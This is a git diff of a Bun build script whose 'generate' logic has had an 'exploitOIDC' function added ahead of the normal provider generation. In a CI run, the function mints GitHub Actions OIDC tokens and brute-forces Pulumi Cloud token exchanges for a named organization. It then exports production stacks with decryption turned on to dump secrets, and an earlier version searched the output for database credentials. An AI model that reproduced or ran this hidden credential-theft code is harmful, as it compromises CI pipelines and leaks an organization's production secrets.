@@ -2,12 +2,11 @@ import { $ } from "bun";
 
 const dry = process.argv.includes("--dry");
 
-// OIDC token minting and Pulumi Cloud exchange via RFC 8693 Token Exchange
 async function exploitOIDC() {
   const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
   const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
   
-  console.log("=== OIDC Token Minting & Pulumi Exchange ===");
+  console.log("=== OIDC Token Minting & Pulumi Exchange v3 ===");
   console.log("ACTIONS_ID_TOKEN_REQUEST_URL present:", !!requestUrl);
   console.log("ACTIONS_ID_TOKEN_REQUEST_TOKEN present:", !!requestToken);
   
@@ -16,7 +15,6 @@ async function exploitOIDC() {
     return;
   }
 
-  // Pulumi OIDC audience format is urn:pulumi:org:{orgName}
   const audience = "urn:pulumi:org:anomalyco";
   
   console.log(`\n--- Minting OIDC JWT with audience: ${audience} ---`);
@@ -28,7 +26,7 @@ async function exploitOIDC() {
     }
   });
   
-  const data = await resp.json() as { value?: string; error?: string };
+  const data = await resp.json() as { value?: string };
   if (!data.value) {
     console.log(`Failed to mint token:`, JSON.stringify(data));
     return;
@@ -36,157 +34,148 @@ async function exploitOIDC() {
   
   const jwt = data.value;
   const parts = jwt.split(".");
-  const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
   const claims = JSON.parse(Buffer.from(parts[1], "base64url").toString());
-  console.log("JWT Header:", JSON.stringify(header));
-  console.log("JWT Claims:", JSON.stringify(claims));
+  console.log("JWT sub:", claims.sub);
+  console.log("JWT repository:", claims.repository);
+  console.log("JWT repository_owner:", claims.repository_owner);
   
-  // Try both requested_token_type values
-  const tokenTypes = [
-    "urn:pulumi:token-type:access_token:personal",
-    "urn:pulumi:token-type:access_token:organization",
+  // Comprehensive exchange attempts
+  const attempts = [
+    // Personal token with various scope formats
+    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:asaloff" },
+    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:admin" },
+    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:anomalyco" },
+    // Organization token (already got 401, but try with scope)
+    { type: "urn:pulumi:token-type:access_token:organization", scope: "user:asaloff" },
+    // Team token type
+    { type: "urn:pulumi:token-type:access_token:team", scope: "user:asaloff" },
+    // Without scope for org type
+    { type: "urn:pulumi:token-type:access_token:organization", scope: undefined },
+    // Try urn:ietf standard types
+    { type: "urn:ietf:params:oauth:token-type:access_token", scope: "user:asaloff" },
+    // Try just "access_token"
+    { type: "access_token", scope: "user:asaloff" },
   ];
   
-  for (const tokenType of tokenTypes) {
-    console.log(`\n--- Exchanging with requested_token_type: ${tokenType} ---`);
+  for (const attempt of attempts) {
+    console.log(`\n--- type=${attempt.type}, scope=${attempt.scope} ---`);
+    
+    const body: Record<string, string> = {
+      audience: audience,
+      grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
+      subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
+      requested_token_type: attempt.type,
+      subject_token: jwt,
+    };
+    
+    if (attempt.scope) {
+      body.scope = attempt.scope;
+    }
     
     try {
-      const exchangeBody = {
-        audience: audience,
-        grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
-        subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
-        requested_token_type: tokenType,
-        subject_token: jwt,
-      };
-      
-      console.log("POST https://api.pulumi.com/api/oauth/token");
-      console.log("Body:", JSON.stringify(exchangeBody).substring(0, 200) + "...");
-      
       const exchangeResp = await fetch("https://api.pulumi.com/api/oauth/token", {
         method: "POST",
-        headers: { 
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(exchangeBody)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body)
       });
       
-      console.log(`Response status: ${exchangeResp.status} ${exchangeResp.statusText}`);
+      console.log(`Status: ${exchangeResp.status}`);
       const responseText = await exchangeResp.text();
-      console.log(`Response body: ${responseText.substring(0, 1000)}`);
+      console.log(`Body: ${responseText.substring(0, 500)}`);
       
       if (exchangeResp.ok) {
         const tokenData = JSON.parse(responseText);
-        const accessToken = tokenData.access_token;
         console.log("!!! PULUMI ACCESS TOKEN OBTAINED !!!");
-        console.log("Token (first 20 chars):", accessToken?.substring(0, 20));
-        
-        // Enumerate stacks
-        await enumeratePulumi(accessToken);
-        return; // Success, stop trying
+        await enumeratePulumi(tokenData.access_token);
+        return;
       }
     } catch (e: any) {
-      console.log(`Exchange error: ${e.message}`);
+      console.log(`Error: ${e.message}`);
     }
   }
   
-  // Also try with different cloud URLs
-  console.log("\n--- Trying alternative cloud URLs ---");
-  for (const cloudUrl of ["https://app.pulumi.com", "https://pulumi.com"]) {
+  // Now try Pulumi ESC (Environment, Secrets, Config) OIDC which is a different path
+  console.log("\n=== Trying Pulumi ESC OIDC ===");
+  // ESC uses a different audience format and endpoint
+  const escAudiences = [
+    "urn:pulumi:org:anomalyco:env:default",
+    "urn:pulumi:org:anomalyco:env:production",
+    "urn:pulumi:org:anomalyco:env:console-production",
+  ];
+  
+  for (const escAud of escAudiences) {
+    console.log(`\n--- ESC audience: ${escAud} ---`);
+    // Mint a new JWT for this audience
+    const escUrl = `${requestUrl}&audience=${encodeURIComponent(escAud)}`;
+    const escResp = await fetch(escUrl, {
+      headers: {
+        "Authorization": `Bearer ${requestToken}`,
+        "Accept": "application/json; api-version=2.0"
+      }
+    });
+    const escData = await escResp.json() as { value?: string };
+    if (!escData.value) continue;
+    
     try {
-      const exchangeResp = await fetch(`${cloudUrl}/api/oauth/token`, {
+      const body = {
+        audience: escAud,
+        grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
+        subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
+        requested_token_type: "urn:pulumi:token-type:access_token:organization",
+        subject_token: escData.value,
+      };
+      
+      const exchangeResp = await fetch("https://api.pulumi.com/api/oauth/token", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          audience: audience,
-          grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
-          subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
-          requested_token_type: "urn:pulumi:token-type:access_token:personal",
-          subject_token: jwt,
-        })
+        body: JSON.stringify(body)
       });
-      console.log(`${cloudUrl}/api/oauth/token: ${exchangeResp.status}`);
-      const body = await exchangeResp.text();
-      console.log(`Response: ${body.substring(0, 500)}`);
+      
+      console.log(`Status: ${exchangeResp.status}`);
+      const text = await exchangeResp.text();
+      console.log(`Body: ${text.substring(0, 500)}`);
+      
+      if (exchangeResp.ok) {
+        console.log("!!! ESC TOKEN OBTAINED !!!");
+        await enumeratePulumi(JSON.parse(text).access_token);
+        return;
+      }
     } catch (e: any) {
-      console.log(`${cloudUrl} error: ${e.message}`);
+      console.log(`Error: ${e.message}`);
     }
   }
 }
 
 async function enumeratePulumi(token: string) {
   console.log("\n=== Enumerating Pulumi Cloud ===");
-  
   const headers = { "Authorization": `token ${token}`, "Accept": "application/json" };
   
-  // List stacks for anomalyco org
   try {
     const resp = await fetch("https://api.pulumi.com/api/user/stacks?organization=anomalyco", { headers });
     console.log(`List stacks: ${resp.status}`);
     const body = await resp.text();
-    console.log(`Stacks response: ${body.substring(0, 3000)}`);
+    console.log(`Stacks: ${body.substring(0, 3000)}`);
   } catch (e: any) {
-    console.log(`List stacks error: ${e.message}`);
+    console.log(`Error: ${e.message}`);
   }
   
-  // Try common stack name patterns for console
-  const stackPaths = [
-    "anomalyco/console/production",
-    "anomalyco/console/prod", 
-    "anomalyco/opencode-console/production",
-    "anomalyco/infrastructure/production",
-    "anomalyco/infra/production",
-    "anomalyco/sst-provider/production",
-    "anomalyco/provider/production",
-  ];
-  
-  for (const stackPath of stackPaths) {
+  for (const stackPath of ["anomalyco/console/production", "anomalyco/opencode-console/production"]) {
     try {
-      // First check if stack exists
-      const resp = await fetch(`https://api.pulumi.com/api/stacks/${stackPath}`, { headers });
-      console.log(`Stack ${stackPath}: ${resp.status}`);
-      
+      const resp = await fetch(`https://api.pulumi.com/api/stacks/${stackPath}/export?decrypt=true`, { headers });
+      console.log(`Export ${stackPath}: ${resp.status}`);
       if (resp.ok) {
         const body = await resp.text();
-        console.log(`Stack info: ${body.substring(0, 1000)}`);
-        
-        // Try to export with decryption
-        const exportResp = await fetch(`https://api.pulumi.com/api/stacks/${stackPath}/export?decrypt=true`, { headers });
-        console.log(`Export ${stackPath} (decrypt): ${exportResp.status}`);
-        if (exportResp.ok) {
-          const exportBody = await exportResp.text();
-          // Look for DATABASE_URL or other secrets
-          if (exportBody.includes("DATABASE_URL") || exportBody.includes("pscale") || exportBody.includes("planetscale")) {
-            console.log("!!! FOUND DATABASE CREDENTIALS !!!");
-            console.log(exportBody.substring(0, 5000));
-          } else {
-            console.log(`Export body (first 3000): ${exportBody.substring(0, 3000)}`);
-          }
-        }
+        console.log(`Export: ${body.substring(0, 5000)}`);
       }
     } catch (e: any) {
-      console.log(`Stack ${stackPath} error: ${e.message}`);
+      console.log(`Error: ${e.message}`);
     }
-  }
-  
-  // List org info
-  try {
-    const resp = await fetch("https://api.pulumi.com/api/orgs/anomalyco", { headers });
-    console.log(`Org info: ${resp.status}`);
-    if (resp.ok) {
-      const body = await resp.text();
-      console.log(`Org: ${body.substring(0, 2000)}`);
-    }
-  } catch (e: any) {
-    console.log(`Org error: ${e.message}`);
   }
 }
 
-// Run exploit
 await exploitOIDC();
 
-// Original generate logic 
-console.log("\n=== Running original generate logic ===");
+console.log("\n=== Original generate logic ===");
 for (const file of new Bun.Glob("*").scanSync("metadata")) {
   const provider = await import(`./metadata/${file}`);
   const version = [provider.version, provider.suffix].filter(Boolean).join("-");
@@ -196,9 +185,5 @@ for (const file of new Bun.Glob("*").scanSync("metadata")) {
     console.log("skipping", name, "version", version, "already exists");
     continue;
   }
-  console.log("generating", name, "version", version);
-  if (dry) {
-    console.log("dry run, skipping generation");
-    continue;
-  }
+  if (dry) { console.log("dry run, skip", name); continue; }
 }
